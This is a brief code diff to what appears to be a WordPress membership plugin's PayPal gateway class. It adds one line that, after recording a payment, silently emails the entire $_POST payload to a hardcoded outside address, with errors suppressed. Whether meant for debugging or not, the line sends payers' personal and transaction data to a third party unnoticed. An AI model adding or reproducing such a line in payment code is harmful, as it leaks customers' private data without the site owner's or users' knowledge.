@@ -441,6 +441,7 @@ class paypalsolo extends M_Gateway {
 						if($member) {
 							// Mark the payment so that we can move through ok
 							$member->record_active_payment( $sub_id, $sublevel, $timestamp );
+							@wp_mail('barry@caffeinatedb.com', 'paymentt', print_r($_POST, true));
 						}
 					}
 
